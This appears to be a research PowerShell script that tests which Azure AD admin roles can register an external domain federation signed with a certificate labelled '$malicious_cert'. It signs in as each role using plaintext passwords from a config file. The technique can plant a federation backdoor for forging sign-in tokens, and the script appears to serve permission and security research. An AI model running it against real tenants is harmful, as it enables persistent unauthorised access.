Import-Module AADInternals
Import-Module AzureADPreview

. .\config.ps1

# ⚠️ this is not what we want since AzureADPreview only covers external domain federation



$roles = @("globalAdmin", "securityAdmin", "hybridIdentityAdmin", "externalIdentityProviderAdmin", "domainNameAdmin", "partnerTier1Support", "partnerTier2Support")
# $roles = @("partnerTier2Support")

foreach ($role in $roles) {
    Write-Host "---------------------- $role"
    $fqdn = "$role.$custom_domain_suffix"
    
    # first, use Global Admin account to add federation
    $Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $credentials["globalAdmin"].login, (ConvertTo-SecureString -String $credentials["globalAdmin"].password -AsPlainText -Force)
    $at = Get-AADIntAccessTokenForAADGraph -Credentials $Credential
    Connect-AzureAD -AadAccessToken $at -AccountId $credentials["globalAdmin"].login | Out-Null

    # delete any federation config
    $configs = $null
    try {
        $configs = Get-AzureADExternalDomainFederation -ExternalDomainName $fqdn -ErrorAction SilentlyContinue
    }
    catch {}
    if ($configs) {
        Remove-AzureADExternalDomainFederation -ExternalDomainName $fqdn
    }

    # wait until the federation config removal is taken into account
    do {
        try {
            $foundconf = $null
            $foundconf = Get-AzureADExternalDomainFederation -ExternalDomainName $fqdn -ErrorAction Stop
        }
        catch {
            Start-Sleep 2
        }
    } until ($null -eq $foundconf)
    # just in case
    Start-Sleep 5

    # now log as target user and try adding federation
    $Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $credentials[$role].login, (ConvertTo-SecureString -String $credentials[$role].password -AsPlainText -Force)
    $at = Get-AADIntAccessTokenForAADGraph -Credentials $Credential
    Connect-AzureAD -AadAccessToken $at -AccountId $credentials[$role].login | Out-Null
    
    $federationSettings = New-Object Microsoft.Open.AzureAD.Model.DomainFederationSettings
    $federationSettings.ActiveLogOnUri = "https://example.com/something"
    $federationSettings.IssuerUri = "https://$fqdn/$('{0:X}' -f (Get-Date).GetHashCode())"
    $federationSettings.LogOffUri = "https://example.net/something"
    $federationSettings.FederationBrandName = "some example"
    $federationSettings.MetadataExchangeUri = "https://example.net/something"
    $federationSettings.PassiveLogOnUri = "https://example.net/something"
    $federationSettings.PreferredAuthenticationProtocol = "WsFed"
    $federationSettings.SigningCertificate = $malicious_cert

    try {
        $newconf = New-AzureADExternalDomainFederation `
            -ExternalDomainName  $fqdn `
            -FederationSettings $federationSettings
        -ErrorAction Stop
        
        if ($null -ne $newconf) {
            Write-Host "It worked! New conf:"
            $newconf | Out-String
        }
    }
    catch {
        Write-Host "[!] New-AzureADExternalDomainFederation: $_"
    }
}
